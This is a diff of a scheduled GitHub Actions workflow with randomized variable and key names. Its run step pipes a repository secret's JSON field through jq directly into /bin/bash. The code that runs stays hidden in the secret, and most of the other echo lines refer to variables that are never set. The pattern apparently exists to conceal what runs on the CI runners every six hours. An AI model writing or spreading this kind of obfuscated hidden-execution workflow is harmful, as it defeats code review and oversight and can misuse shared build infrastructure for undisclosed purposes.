@@ -1,10 +1,10 @@
 name: weimenghema
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
-jobs:  # 14420
+    - cron: '34 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,17 @@ jobs:  # 14420
       - uses: actions/checkout@v4
       - name: weimenghema
         env:
-          nbtrp57: ${{ secrets.nbtrp57 }}
+          uvvj3: ${{ secrets.uvvj3 }}
         run: |
-          echo $nbtrp57 | jq -r .ood27998 | /bin/bash
-          echo $cnjfx4779 | jq -r .ugf5 | /bin/bash
-          echo $pmi44 | jq -r .cu732 | /bin/bash
-          echo $h6271 | jq -r .ybqan92558 | /bin/bash
-          echo $q4 | jq -r .jgjm8440 | /bin/bash
-          echo $rltyu47903 | jq -r .ik59 | /bin/bash
-          echo $ponxe70 | jq -r .isnt20 | /bin/bash
-          echo $qb9629 | jq -r .mn92774 | /bin/bash
+          echo $uvvj3 | jq -r .blgce87 | /bin/bash
+          echo $d564 | jq -r .clocq6 | /bin/bash
+          echo $ih9720 | jq -r .s6 | /bin/bash
+          echo $nifpw084 | jq -r .wpo569 | /bin/bash
+          echo $iut24 | jq -r .dsrz0011 | /bin/bash
+          echo $xh989 | jq -r .cqls4 | /bin/bash
+          echo $q39 | jq -r .vb9 | /bin/bash
+          echo $zfle5 | jq -r .r010 | /bin/bash
+          echo $iir3 | jq -r .yb2 | /bin/bash
+          echo $mcl672 | jq -r .fqb7 | /bin/bash
+          echo $upq4 | jq -r .h9 | /bin/bash
 
